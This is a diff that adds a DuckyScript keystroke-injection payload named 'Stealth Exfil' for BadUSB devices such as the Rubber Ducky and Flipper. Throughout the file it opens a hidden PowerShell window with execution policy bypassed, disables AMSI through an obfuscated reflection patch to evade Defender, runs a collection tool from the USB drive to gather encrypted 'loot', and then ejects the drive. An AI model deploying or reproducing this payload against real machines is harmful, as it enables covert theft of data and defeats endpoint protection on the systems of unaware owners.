@@ -1,0 +1,39 @@
+REM ============================================================
+REM TREASURE-HUNTER: Stealth Exfil
+REM ============================================================
+REM AMSI bypass + hidden execution + encrypted output + auto-eject
+REM Device: Hak5 Rubber Ducky / O.MG / Flipper BadUSB
+REM Duration: ~15s keystroke + 5min scan
+REM OPSEC: High -- hidden window, AMSI bypassed, output encrypted
+REM ============================================================
+
+REM Wait for USB enumeration
+DELAY 2000
+
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Launch PowerShell completely hidden (-w hidden)
+STRING powershell -w hidden -ep bypass -nop
+ENTER
+DELAY 1500
+
+REM Stage 1: AMSI bypass (patch AmsiScanBuffer in memory)
+REM This disables AMSI so Defender won't scan our PowerShell commands
+STRING $a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');$f=$a.GetField('am'+'siInitFailed','NonPublic,Static');$f.SetValue($null,$true)
+ENTER
+DELAY 500
+
+REM Stage 2: Find USB drive letter dynamically
+STRING $d=(Get-Volume|?{Test-Path "$($_.DriveLetter):\treasure-hunter.exe"}).DriveLetter
+ENTER
+DELAY 300
+
+REM Stage 3: Execute treasure-hunter with encryption
+STRING if($d){& "$d`:\treasure-hunter.exe" -p smash -o "$d`:\loot.jsonl" --encrypt --passphrase 'engagement-key-2024' -q}
+ENTER
+
+REM Stage 4: Wait for scan to complete, then eject USB
+STRING Start-Sleep -Seconds 330; if($d){(New-Object -ComObject Shell.Application).NameSpace(17).ParseName("$d`:").InvokeVerb('Eject')}; exit
+ENTER
